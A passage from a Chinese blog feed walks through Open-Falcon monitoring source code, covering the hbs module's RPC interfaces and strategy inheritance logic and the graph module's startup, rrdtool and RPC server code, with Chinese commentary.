&lt; before &#123;</span><br><span class="line">Agents.Delete(curr.ReportRequest.Hostname)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>http服务初始化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//init函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">configCommonRoutes()  <span class="comment">//注册通用api</span></span><br><span class="line">configProcRoutes()    <span class="comment">//注册获取策略等信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rpc接口初始化：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line">addr := g.Config().Listen</span><br><span class="line"></span><br><span class="line">server := rpc.NewServer()</span><br><span class="line"><span class="comment">// server.Register(new(filter.Filter))</span></span><br><span class="line">server.Register(<span class="built_in">new</span>(Agent))</span><br><span class="line">server.Register(<span class="built_in">new</span>(Hbs))</span><br><span class="line"></span><br><span class="line">l, e := net.Listen(<span class="string">"tcp"</span>, addr)</span><br><span class="line"><span class="keyword">if</span> e != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"listen error:"</span>, e)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"listening"</span>, addr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := l.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">"listener accept fail:"</span>, err)</span><br><span class="line">time.Sleep(time.Duration(<span class="number">100</span>) * time.Millisecond)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> server.ServeCodec(jsonrpc.NewServerCodec(conn))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本流程分析完毕，我们主要来看下hbs提供出来的rpc函数有那些：</p><p>agent rpc接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MinePlugin函数主要从缓存中查询plugins插件列表</span><br><span class="line">ReportStatus获取到agent来的状态数据，更新缓存中的数据</span><br><span class="line">TrustableIps白名单，从配置文件中读取</span><br><span class="line">BuiltinMetrics，agent按照server端的配置，按需采集的metric</span><br></pre></td></tr></table></figure><p>hbs rpc接口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GetExpressions 获取查询表达式</span><br><span class="line">GetStrategies 获取strategy策略，用于judge调用</span><br></pre></td></tr></table></figure><p>我们来看下这个函数GetStrategies，这个函数主要用于给judge定时更新策略的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *Hbs)</span> <span class="title">GetStrategies</span><span class="params">(req model.NullRpcRequest, reply *model.StrategiesResponse)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">reply.HostStrategies = []*model.HostStrategy&#123;&#125;</span><br><span class="line"><span class="comment">// 一个机器ID对应多个模板ID</span></span><br><span class="line">hidTids := cache.HostTemplateIds.GetMap()</span><br><span class="line">sz := <span class="built_in">len</span>(hidTids)</span><br><span class="line"><span class="keyword">if</span> sz == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Judge需要的是hostname，此处要把HostId转换为hostname</span></span><br><span class="line"><span class="comment">// 查出的hosts，是不处于维护时间内的</span></span><br><span class="line">hosts := cache.MonitoredHosts.Get()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(hosts) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// 所有机器都处于维护状态，汗</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 查询所有模板信息</span></span><br><span class="line">tpls := cache.TemplateCache.GetMap()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(tpls) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询所有策略信息</span></span><br><span class="line">strategies := cache.Strategies.GetMap()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(strategies) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 做个索引，给一个tplId，可以很方便的找到对应了哪些Strategy</span></span><br><span class="line">tpl2Strategies := Tpl2Strategies(strategies)</span><br><span class="line"></span><br><span class="line">hostStrategies := <span class="built_in">make</span>([]*model.HostStrategy, <span class="number">0</span>, sz)</span><br><span class="line"><span class="keyword">for</span> hostId, tplIds := <span class="keyword">range</span> hidTids &#123;</span><br><span class="line"></span><br><span class="line">h, exists := hosts[hostId]</span><br><span class="line"><span class="keyword">if</span> !exists &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算当前host配置了哪些监控策略</span></span><br><span class="line">ss := CalcInheritStrategies(tpls, tplIds, tpl2Strategies)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ss) &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hs := model.HostStrategy&#123;</span><br><span class="line">Hostname:   h.Name,</span><br><span class="line">Strategies: ss,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hostStrategies = <span class="built_in">append</span>(hostStrategies, &amp;hs)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reply.HostStrategies = hostStrategies</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Tpl2Strategies函数根据strategies查询所有模板信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Tpl2Strategies</span><span class="params">(strategies <span class="keyword">map</span>[<span class="keyword">int</span>]*model.Strategy)</span> <span class="title">map</span>[<span class="title">int</span>][]*<span class="title">model</span>.<span class="title">Strategy</span></span> &#123;</span><br><span class="line">ret := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>][]*model.Strategy)</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> strategies &#123;</span><br><span class="line"><span class="keyword">if</span> s == <span class="literal">nil</span> || s.Tpl == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, exists := ret[s.Tpl.Id]; exists &#123;</span><br><span class="line">ret[s.Tpl.Id] = <span class="built_in">append</span>(ret[s.Tpl.Id], s)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ret[s.Tpl.Id] = []*model.Strategy&#123;s&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CalcInheritStrategies函数用于计算当前host机器有多少策略：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CalcInheritStrategies</span><span class="params">(allTpls <span class="keyword">map</span>[<span class="keyword">int</span>]*model.Template, tids []<span class="keyword">int</span>, tpl2Strategies <span class="keyword">map</span>[<span class="keyword">int</span>][]*model.Strategy)</span> []<span class="title">model</span>.<span class="title">Strategy</span></span> &#123;</span><br><span class="line"><span class="comment">// 根据模板的继承关系，找到每个机器对应的模板全量</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * host_id =&gt;</span></span><br><span class="line"><span class="comment"> * |a |d |a |a |a |</span></span><br><span class="line"><span class="comment"> * |  |  |b |b |f |</span></span><br><span class="line"><span class="comment"> * |  |  |  |c |  |</span></span><br><span class="line"><span class="comment"> * |  |  |  |  |  |</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">tpl_buckets := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> _, tid := <span class="keyword">range</span> tids &#123;</span><br><span class="line">        <span class="comment">// 查找所有id的parentid</span></span><br><span class="line">ids := cache.ParentIds(allTpls, tid)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(ids) &lt;= <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">tpl_buckets = <span class="built_in">append</span>(tpl_buckets, ids)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每个host 关联的模板，有继承关系的放到同一个bucket中，其他的放在各自单独的bucket中</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * host_id =&gt;</span></span><br><span class="line"><span class="comment"> * |a |d |a |</span></span><br><span class="line"><span class="comment"> * |b |  |f |</span></span><br><span class="line"><span class="comment"> * |c |  |  |</span></span><br><span class="line"><span class="comment"> * |  |  |  |</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">count := <span class="built_in">len</span>(tpl_buckets)</span><br><span class="line">uniq_tpl_buckets := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; count; i++ &#123;</span><br><span class="line"><span class="keyword">var</span> valid <span class="keyword">bool</span> = <span class="literal">true</span></span><br><span class="line"><span class="keyword">for</span> j := <span class="number">0</span>; j &lt; count; j++ &#123;</span><br><span class="line"><span class="keyword">if</span> i == j &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> slice_int_eq(tpl_buckets[i], tpl_buckets[j]) &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> slice_int_lt(tpl_buckets[i], tpl_buckets[j]) &#123;</span><br><span class="line">valid = <span class="literal">false</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> valid &#123;</span><br><span class="line">uniq_tpl_buckets = <span class="built_in">append</span>(uniq_tpl_buckets, tpl_buckets[i])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承覆盖父模板策略，得到每个模板聚合后的策略列表</span></span><br><span class="line">strategies := []model.Strategy&#123;&#125;</span><br><span class="line"></span><br><span class="line">exists_by_id := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">for</span> _, bucket := <span class="keyword">range</span> uniq_tpl_buckets &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开始计算一个桶，先计算老的tid，再计算新的，所以可以覆盖</span></span><br><span class="line"><span class="comment">// 该桶最终结果</span></span><br><span class="line">bucket_stras_map := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]*model.Strategy)</span><br><span class="line"><span class="keyword">for</span> _, tid := <span class="keyword">range</span> bucket &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个tid对应的策略列表</span></span><br><span class="line">the_tid_stras := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>][]*model.Strategy)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> stras, ok := tpl2Strategies[tid]; ok &#123;</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> stras &#123;</span><br><span class="line">uuid := fmt.Sprintf(<span class="string">"metric:%s/tags:%v"</span>, s.Metric, utils.SortedTags(s.Tags))</span><br><span class="line"><span class="keyword">if</span> _, ok2 := the_tid_stras[uuid]; ok2 &#123;</span><br><span class="line">the_tid_stras[uuid] = <span class="built_in">append</span>(the_tid_stras[uuid], s)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">the_tid_stras[uuid] = []*model.Strategy&#123;s&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 覆盖父模板</span></span><br><span class="line"><span class="keyword">for</span> uuid, ss := <span class="keyword">range</span> the_tid_stras &#123;</span><br><span class="line">bucket_stras_map[uuid] = ss</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">last_tid := bucket[<span class="built_in">len</span>(bucket)<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换所有策略的模板为最年轻的模板</span></span><br><span class="line"><span class="keyword">for</span> _, ss := <span class="keyword">range</span> bucket_stras_map &#123;</span><br><span class="line"><span class="keyword">for</span> _, s := <span class="keyword">range</span> ss &#123;</span><br><span class="line">valStrategy := *s</span><br><span class="line"><span class="comment">// exists_by_id[s.Id] 是根据策略ID去重，不太确定是否真的需要，不过加上肯定没问题</span></span><br><span class="line"><span class="keyword">if</span> _, exist := exists_by_id[valStrategy.Id]; !exist &#123;</span><br><span class="line"><span class="keyword">if</span> valStrategy.Tpl.Id != last_tid &#123;</span><br><span class="line">valStrategy.Tpl = allTpls[last_tid]</span><br><span class="line">&#125;</span><br><span class="line">strategies = <span class="built_in">append</span>(strategies, valStrategy)</span><br><span class="line">exists_by_id[valStrategy.Id] = <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> strategies</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hbs中主要的功能分析完毕。相应的需要结合judge和agent来看各个rpc接口调用关系了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;open-falcon-hbs源码分析&quot;&gt;&lt;a href=&quot;#open-falcon-hbs源码分析&quot; class=&quot;headerlink&quot; title=&quot;open-falcon hbs源码分析&quot;&gt;&lt;/a&gt;open-falcon hbs源码分析&lt;/h2&gt;&lt;p&gt;本篇
      
    
    </summary>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/categories/monitor/"/>
    
    
      <category term="monitor" scheme="http://www.mydreamdll.xyz/tags/monitor/"/>
    
  </entry>
  
  <entry>
    <title>open-falcon graph 源码分析</title>
    <link href="http://www.mydreamdll.xyz/2020/01/21/graph%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://www.mydreamdll.xyz/2020/01/21/graph%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-01-21T09:07:44.425Z</published>
    <updated>2020-01-21T09:06:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="open-falcon-graph源码分析"><a href="#open-falcon-graph源码分析" class="headerlink" title="open-falcon graph源码分析"></a>open-falcon graph源码分析</h2><p>graph主流程在modules/graph/main中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">g.BinaryName = BinaryName</span><br><span class="line">g.Version = Version</span><br><span class="line">g.GitCommit = GitCommit</span><br><span class="line"></span><br><span class="line">cfg := flag.String(<span class="string">"c"</span>, <span class="string">"cfg.json"</span>, <span class="string">"specify config file"</span>)</span><br><span class="line">version := flag.Bool(<span class="string">"v"</span>, <span class="literal">false</span>, <span class="string">"show version"</span>)</span><br><span class="line">versionGit := flag.Bool(<span class="string">"vg"</span>, <span class="literal">false</span>, <span class="string">"show version and git commit log"</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *version &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *versionGit &#123;</span><br><span class="line">fmt.Printf(<span class="string">"Open-Falcon %s version %s, build %s\n"</span>, BinaryName, Version, GitCommit)</span><br><span class="line">os.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// global config</span></span><br><span class="line">    <span class="comment">// 解析配置文件</span></span><br><span class="line">g.ParseConfig(*cfg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> g.Config().Debug &#123;</span><br><span class="line">g.InitLog(<span class="string">"debug"</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">g.InitLog(<span class="string">"info"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// init db</span></span><br><span class="line">    <span class="comment">// 初始化数据库，连接不上失败</span></span><br><span class="line">g.InitDB()</span><br><span class="line"><span class="comment">// rrdtool init</span></span><br><span class="line">    <span class="comment">// rrd初始化</span></span><br><span class="line">rrdtool.InitChannel()</span><br><span class="line"><span class="comment">// rrdtool before api for disable loopback connection</span></span><br><span class="line">rrdtool.Start()</span><br><span class="line"><span class="comment">// start api</span></span><br><span class="line"><span class="keyword">go</span> api.Start()</span><br><span class="line"><span class="comment">// start indexing</span></span><br><span class="line">    <span class="comment">// index更新，定期刷新数据到数据库中</span></span><br><span class="line">index.Start()</span><br><span class="line"><span class="comment">// start http server</span></span><br><span class="line"><span class="keyword">go</span> http.Start()</span><br><span class="line">    <span class="comment">// 定时清理无效数据</span></span><br><span class="line"><span class="keyword">go</span> cron.CleanCache()</span><br><span class="line"></span><br><span class="line">start_signal(os.Getpid(), g.Config())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rrdtool启动，启动协程定时写磁盘数据</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line">cfg := g.Config()</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="comment">// check data dir</span></span><br><span class="line"><span class="keyword">if</span> err = file.EnsureDirRW(cfg.RRD.Storage); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">"rrdtool.Start error, bad data dir "</span>+cfg.RRD.Storage+<span class="string">","</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">migrate_start(cfg)</span><br><span class="line"></span><br><span class="line"><span class="comment">// sync disk</span></span><br><span class="line">    <span class="comment">// 写入rdd数据</span></span><br><span class="line"><span class="keyword">go</span> syncDisk()</span><br><span class="line">    <span class="comment">// task不同任务刷新</span></span><br><span class="line"><span class="keyword">go</span> ioWorker()</span><br><span class="line">log.Println(<span class="string">"rrdtool.Start ok"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>api模块启动</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> !g.Config().Rpc.Enabled &#123;</span><br><span class="line">log.Println(<span class="string">"rpc.Start warning, not enabled"</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">addr := g.Config().Rpc.Listen</span><br><span class="line">tcpAddr, err := net.ResolveTCPAddr(<span class="string">"tcp"</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"rpc.Start error, net.ResolveTCPAddr failed, %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">listener, err := net.ListenTCP(<span class="string">"tcp"</span>, tcpAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">"rpc.Start error, listen %s failed, %s"</span>, addr, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">log.Println(<span class="string">"rpc.Start ok, listening on"</span>, addr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rpc.Register(<span class="built_in">new</span>(Graph))  <span class="comment">// rpc接口注册</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> tempDelay time.Duration <span class="comment">// how long to sleep on accept failure</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> tempDelay == <span class="number">0</span> &#123;</span><br><span class="line">tempDelay = <span class="number">5</span> * time.Millisecond</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">tempDelay *= <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> max := <span class="number">1</span> * time.Second; tempDelay &gt; max &#123;</span><br><span class="line">tempDelay = max</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(tempDelay)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">tempDelay = <span class="number">0</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">e := connects.insert(conn)</span><br><span class="line"><span class="keyword">defer</span> connects.remove(e)</span><br><span class="line">rpc.ServeConn(conn)</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-Close_chan:</span><br><span class="line">log.Println(<span class="string">"rpc, recv sigout and 